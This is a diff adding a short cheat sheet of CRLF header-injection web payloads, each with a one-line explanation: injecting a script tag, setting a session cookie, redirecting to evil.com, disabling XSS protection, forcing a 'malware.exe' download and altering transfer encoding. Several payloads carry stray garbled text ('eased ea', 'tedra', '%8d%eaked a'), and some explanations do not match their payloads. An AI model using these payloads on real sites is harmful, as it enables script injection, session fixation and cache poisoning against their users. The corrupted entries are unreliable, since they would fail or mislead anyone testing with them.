@@ -1,0 +1,32 @@
+crifinjection
+ADVANCE CRLF INJECTIONS 
+
+/%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+: This payload attempts to inject a new Content-Type header and an HTML script tag to execute an alert function.
+
+/%0d%0aSet-Cookie: sessionid-tested eased ea
+: This payload attempts to set a new cookie with the name "sessionid" and the value "test".
+
+/%0d%0aLocation: http://evil.com%8d%eaked a
+: This payload attempts to redirect the user to a malicious website "http://evil.com".
+
+/%0d%0aContent-Length: 0%0d%0a%0d%0a
+This payload attempts to alter the Content-Length header, which can lead to various attacks, such as truncation or buffer overflow.
+
+/%0d%0aX-XSS-Protection: 0%0d%0a%0d%0a
+: This payload attempts to disable the built-in XSS protection in some browsers.
+
+/%0d%0aTransfer-Encoding: chunked %0d%0a%0d%0a%0d%0a%0d%0a
+: This payload attempts to switch the transfer encoding to chunked and send a chunk with a length of e, which can lead to various attacks, such as response splitting or cache poisoning.
+
+/%0d%0aContent-Type: application/x-www-form-urlencoded dead
+: This payload attempts to change the Content-Type header to "application/x-www-form-urlencoded", which can lead to various attacks, such as parameter pollution or injection.
+
+/%0d%0aContent-Disposition: attachment; filename=malware.exe%0d%0a%0d%0a
+This payload attempts to force the download of a file named "malware.exe".
+
+/%0d%0aContent-Encoding: gzip%0d%0atedra
+This payload attempts to change the Content-Encoding header to "gzip", which can lead to various attacks, such as compression-based attacks or decompression bombs.
+
+/%0d%0aContent-Type: multipart/form-data; boundary=----7e13941d1f0140%0d%0a%0d%0a
+: This payload attempts to change the Content-Type header to "multipart/form-data" and set a custom boundary, which can lead to various attacks, such as file upload or parameter pollution.
